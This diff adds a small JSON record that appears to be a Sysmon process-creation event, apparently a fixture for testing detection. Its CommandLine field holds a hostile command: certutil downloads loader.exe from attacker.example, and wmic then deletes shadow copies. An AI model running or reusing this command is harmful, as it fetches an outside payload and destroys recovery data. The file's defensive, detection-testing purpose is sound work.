@@ -1,0 +1,8 @@
+{
+  "EventID": 1,
+  "Image": "C:\\Windows\\System32\\cmd.exe",
+  "CommandLine": "cmd.exe /c certutil -urlcache -f http://attacker.example/loader.exe loader.exe && wmic shadowcopy delete",
+  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+  "User": "CORP\\victim",
+  "_time": "2026-04-25T15:02:00Z"
+}
